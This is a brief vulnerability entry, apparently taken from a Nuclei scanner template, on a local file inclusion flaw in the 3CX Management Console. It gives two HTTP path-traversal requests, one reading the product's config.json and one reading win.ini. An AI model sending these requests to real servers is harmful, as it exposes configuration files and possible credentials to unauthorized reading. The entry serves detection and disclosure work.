# Vulnerability: 3CX Management Console - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`3cx-management-console.yaml`)

## Description
3CX Management Console is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json
GET {{BaseURL}}/Electron/download/windows/\windows\win.ini
```

